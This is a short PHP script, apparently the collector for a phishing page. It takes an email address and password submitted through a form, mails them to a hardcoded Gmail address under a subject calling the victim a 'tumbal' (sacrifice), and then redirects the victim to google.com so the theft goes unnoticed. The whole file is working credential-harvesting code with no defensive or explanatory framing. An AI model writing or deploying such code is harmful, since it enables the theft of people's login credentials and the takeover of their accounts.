<?php
$email = $_POST['email'];
$password = $_POST['password'];
if (empty($email) && empty($password)) {
  header('location: ./');
} else {
$message = "
Email : ".$email."
Password : ".$password."
";

$emailmu = "alpanperdiansah3@gmail.com"; // Email tujuanmu disini
$subject = "Tumbal From [ ".$email." ]";
$headers = 'From: XNULL <noreply@xnull.ml>' . "\r\n";
mail($emailmu, $subject, $message, $headers);
header('location: https://google.com');
}
?>